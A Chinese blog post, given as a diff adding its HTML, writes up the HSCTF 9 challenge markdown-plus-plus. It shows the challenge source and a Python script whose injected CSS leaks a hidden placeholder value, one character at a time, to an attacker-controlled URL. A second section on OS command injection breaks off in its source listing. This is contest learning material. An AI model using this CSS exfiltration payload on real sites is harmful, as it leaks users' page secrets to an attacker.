@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="题目难度中下的一次CTF之旅，不愧是面向高中生的比赛。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hsctf-9_2022">
+<meta property="og:url" content="http://example.com/2022/09/26/hsctf-9-2022/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="题目难度中下的一次CTF之旅，不愧是面向高中生的比赛。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.imgur.com/p1Fn8kx.png">
+<meta property="og:image" content="https://i.imgur.com/dL9jmTI.png">
+<meta property="og:image" content="https://i.imgur.com/ZVBMwYK.png">
+<meta property="og:image" content="https://i.imgur.com/mYnXOc8.png">
+<meta property="og:image" content="http://example.com/2022/09/26/hsctf-9-2022/images/image-20220925222720027.png">
+<meta property="og:image" content="https://i.imgur.com/acp4kfv.png">
+<meta property="og:image" content="https://i.imgur.com/saT4xcY.png">
+<meta property="og:image" content="https://i.imgur.com/htRgxf5.png">
+<meta property="og:image" content="https://i.imgur.com/V7Aenge.png">
+<meta property="og:image" content="https://i.imgur.com/t7UZRxU.png">
+<meta property="og:image" content="https://i.imgur.com/SfeAgfZ.png">
+<meta property="og:image" content="https://i.imgur.com/FrJWAuh.png">
+<meta property="og:image" content="https://i.imgur.com/xhHDujG.png">
+<meta property="og:image" content="https://i.imgur.com/ODtPmX2.png">
+<meta property="og:image" content="https://i.imgur.com/3ZpgMXn.png">
+<meta property="og:image" content="https://i.imgur.com/Jqgr9f4.png">
+<meta property="og:image" content="https://i.imgur.com/e9uJByU.png">
+<meta property="og:image" content="http://example.com/images/image-20220926213057108.png">
+<meta property="article:published_time" content="2022-09-26T13:29:04.000Z">
+<meta property="article:modified_time" content="2022-09-26T13:43:48.630Z">
+<meta property="article:author" content="MirRoR4s">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/p1Fn8kx.png">
+
+<link rel="canonical" href="http://example.com/2022/09/26/hsctf-9-2022/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hsctf-9_2022 | 学习记录</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">学习记录</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/26/hsctf-9-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="不能说的秘密">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hsctf-9_2022
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-26 21:29:04 / 修改时间：21:43:48" itemprop="dateCreated datePublished" datetime="2022-09-26T21:29:04+08:00">2022-09-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!--toc-->
+<p>题目难度中下的一次CTF之旅，不愧是面向高中生的比赛。</p>
+<span id="more"></span>
+<h2 id="web"><a href="#Web" class="headerlink" title="Web"></a>Web<a href="#web" class="header-anchor">#</a></h2><h3 id="markdown-plus-plus-css-zhu-ru"><a href="#markdown-plus-plus-CSS注入" class="headerlink" title="markdown-plus-plus-CSS注入"></a>markdown-plus-plus-CSS注入<a href="#markdown-plus-plus-css-zhu-ru" class="header-anchor">#</a></h3><p>先弄清楚题目的业务流程，之后找漏洞点。打开题目环境进入网站页面如下：</p>
+<p><img src="https://i.imgur.com/p1Fn8kx.png" alt></p>
+<p>题目源代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, render_template, request, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ[<span class="string">&quot;SECRET&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&quot;/create&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>():</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;display.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">		session[<span class="string">&quot;username&quot;</span>] = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">		<span class="keyword">return</span> redirect(request.referrer <span class="keyword">or</span> <span class="string">&quot;/&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Username not provided&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">help</span>():</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;help.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure>
+<p>阅读完上述代码后没有发现明显的漏洞点，只能走一遍业务流程了。我们可以进行的操作是login和display page，其中login根据代码我们知道只是单纯的设置session，所以我们的重点应该是在display page这里。随便输入一串字符，页面的回显如下：</p>
+<p><img src="https://i.imgur.com/dL9jmTI.png" alt></p>
+<p>可以看到我们自动跳转到了/display 页面，根据题目的源代码，当我们访问根目录时会重定向到/create页面并执行create函数，该函数会对create.html进行渲染。那我们是如何跳转到/display页面的呢？答案就在/create页面的js文件中。</p>
+<p><img src="https://i.imgur.com/ZVBMwYK.png" alt></p>
+<p>create.js的源代码如下：</p>
+<p><img src="https://i.imgur.com/mYnXOc8.png" alt></p>
+<p>create.js的作用就是将我们在display page的输入进行base64编码，然后重定向到“/display#+编码后的结果”这个页面。我们继续跟进看看/display页面是否存在漏洞点，发现该页面存在display.js，其源代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generate_id</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;id&quot;</span> + i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">markdown</span>) &#123;</span><br><span class="line">	<span class="comment">//TODO implement per-element custom styles</span></span><br><span class="line">	<span class="keyword">let</span> stylesheet = [];</span><br><span class="line">	<span class="keyword">let</span> tree = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>();</span><br><span class="line">	<span class="keyword">while</span> (markdown.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">let</span> node = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;span&quot;</span>);</span><br><span class="line">		<span class="keyword">let</span> id = <span class="title function_">generate_id</span>();</span><br><span class="line">		node.<span class="property">id</span> = id;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">let</span> parsed,</span><br><span class="line">			style = <span class="string">&quot;&quot;</span>,</span><br><span class="line">			sub_stylesheet = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[b &quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// bold</span></span><br><span class="line">			style = <span class="string">&quot;font-weight: bold&quot;</span>;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown.<span class="title function_">substring</span>(<span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[i &quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// italics</span></span><br><span class="line">			style = <span class="string">&quot;font-style: italic&quot;</span>;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown.<span class="title function_">substring</span>(<span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[` &quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// code</span></span><br><span class="line">			style = <span class="string">`background-color: #eee;</span></span><br><span class="line"><span class="string">			border-radius: 3px;</span></span><br><span class="line"><span class="string">			font-family: monospace;</span></span><br><span class="line"><span class="string">			padding: 0 3px;`</span>;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown.<span class="title function_">substring</span>(<span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[u &quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// underline</span></span><br><span class="line">			style = <span class="string">&quot;text-decoration: underline&quot;</span>;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown.<span class="title function_">substring</span>(<span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[s &quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// strikethrough</span></span><br><span class="line">			style = <span class="string">&quot;text-decoration: line-through&quot;</span>;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown.<span class="title function_">substring</span>(<span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[c=&quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// color</span></span><br><span class="line">			markdown = markdown.<span class="title function_">substring</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">let</span> arr = markdown.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			<span class="keyword">let</span> color = arr.<span class="title function_">shift</span>();</span><br><span class="line">			markdown = arr.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			style = <span class="string">&quot;color:&quot;</span> + color;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[h=&quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// highlight</span></span><br><span class="line">			markdown = markdown.<span class="title function_">substring</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">let</span> arr = markdown.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			<span class="keyword">let</span> color = arr.<span class="title function_">shift</span>();</span><br><span class="line">			markdown = arr.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			style = <span class="string">&quot;background-color:&quot;</span> + color;</span><br><span class="line"></span><br><span class="line">			[parsed, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;[a=&quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// links</span></span><br><span class="line">			markdown = markdown.<span class="title function_">substring</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">			parsed = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">			<span class="keyword">let</span> arr = markdown.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			<span class="keyword">let</span> href = arr.<span class="title function_">shift</span>();</span><br><span class="line">			markdown = arr.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			parsed.<span class="property">href</span> = href;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">let</span> content;</span><br><span class="line">			[content, markdown, sub_stylesheet] = <span class="title function_">parse</span>(markdown);</span><br><span class="line">			parsed.<span class="title function_">append</span>(content);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (markdown.<span class="title function_">startsWith</span>(<span class="string">&quot;]&quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">// end tag</span></span><br><span class="line">			<span class="keyword">return</span> [tree, markdown.<span class="title function_">substring</span>(<span class="number">1</span>), stylesheet];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// match up to the next unescaped [ or ]</span></span><br><span class="line">			<span class="keyword">var</span> [_, text, markdown] = markdown.<span class="title function_">match</span>(<span class="regexp">/^((?:(?![^\\][[\]]).)*.?)(.*)/</span>);</span><br><span class="line">			parsed = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(text);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		node.<span class="title function_">append</span>(parsed);</span><br><span class="line">		stylesheet.<span class="title function_">push</span>(<span class="string">`#<span class="subst">$&#123;id&#125;</span>&#123;<span class="subst">$&#123;style&#125;</span>;&#125;`</span>);</span><br><span class="line">		stylesheet.<span class="title function_">push</span>(...sub_stylesheet);</span><br><span class="line">		tree.<span class="title function_">append</span>(node);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> [tree, <span class="string">&quot;&quot;</span>, stylesheet];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">display</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> markdown = <span class="title function_">atob</span>(location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> [el, _, stylesheet] = <span class="title function_">parse</span>(markdown);</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>).<span class="title function_">appendChild</span>(el);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;style&quot;</span>);</span><br><span class="line">	style.<span class="property">textContent</span> = stylesheet.<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">display</span>();</span><br></pre></td></tr></table></figure>
+<p>该javascript脚本自动调用display函数，其中let markdown = atob(location.hash.substring(1));这一句代码将我们在display page处的输入赋值给markdown，之后调用parse函数进行处理。总体阅读完代码之后发现这个脚本会根据用户的输入来设置页面特定元素的样式。</p>
+<p>先来看看我们如何输入才能设置样式，还记得前面的主页的help吗?</p>
+<p><img src="images/image-20220925222720027.png" alt="image-20220925222720027"></p>
+<p>点击Help的结果如下：</p>
+<p><img src="https://i.imgur.com/acp4kfv.png" alt></p>
+<p>看到这我们对本题的业务流程就很清晰了，先看看正常的输入的回显结果是什么样子的，我们输入[c=red text]。</p>
+<p><img src="https://i.imgur.com/saT4xcY.png" alt></p>
+<p>回显结果如下：</p>
+<p><img src="https://i.imgur.com/htRgxf5.png" alt></p>
+<p>根据display.js的这一部分代码发现存在CSS注入漏洞：</p>
+<p><img src="https://i.imgur.com/V7Aenge.png" alt></p>
+<p><img src="https://i.imgur.com/t7UZRxU.png" alt></p>
+<p>当我们输入[c=red …]，函数最终的结果为<style>#id0{;} #id1{color:red;} #id2{;}</style></p>
+<p>这段代码将选择id为1的元素，将其文本内容的颜色设置为红色</p>
+<p><img src="https://i.imgur.com/SfeAgfZ.png" alt></p>
+<p>当我们输入[c=red;}hoge{…}#id1{color:blue …]，最终结果为<style>#id0{color:red;}hoge{…}#id0{color:blue;}</style>。</p>
+<p><img src="https://i.imgur.com/FrJWAuh.png" alt></p>
+<p>可以看到我们通过提前闭合了;}，从而覆盖了前面的红色的颜色设置。</p>
+<p>这种类型的CSS注入一般都是读取某元素的标签属性的值，还记得之前主页面我们输入的login么？</p>
+<p><img src="https://i.imgur.com/xhHDujG.png" alt></p>
+<p>猜测flag被隐藏在input标签的placeholder属性中，所以我们可以闭合;}，然后注入我们的CSS代码读取input元素的placeholder属性值。具体的CSS注入可以看这里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;[c=red;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">    c = <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&quot;_&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    query = name + c</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&quot;&#x27;&quot;</span>:</span><br><span class="line">        c = <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line">        query = name + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    payload += <span class="string">f&quot;input[placeholder^=&#x27;<span class="subst">&#123;name+c&#125;</span>&#x27;]&#123;&#123;background-image:url(MYURL?q=<span class="subst">&#123;query&#125;</span>);&#125;&#125;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;#id1&#123;color:blue hoge]&quot;</span></span><br><span class="line">base_url = <span class="string">&quot;http://web1.hsctf.com:8002/display&quot;</span></span><br><span class="line">payload_url = base_url + <span class="string">&quot;#&quot;</span> + b64encode(payload.encode()).decode()</span><br><span class="line"></span><br><span class="line">post_url = <span class="string">&quot;http://web1.hsctf.com:8000/markdown-plus-plus&quot;</span></span><br><span class="line">r = requests.post(post_url, data=&#123;<span class="string">&quot;url&quot;</span>: payload_url&#125;, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
+<h3 id="h3-png-wizard-os-ming-ling-zhu-ru"><a href="#h3-png-wizard-OS命令注入" class="headerlink" title="h3 png-wizard-OS命令注入"></a>h3 png-wizard-OS命令注入<a href="#h3-png-wizard-os-ming-ling-zhu-ru" class="header-anchor">#</a></h3><p>源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 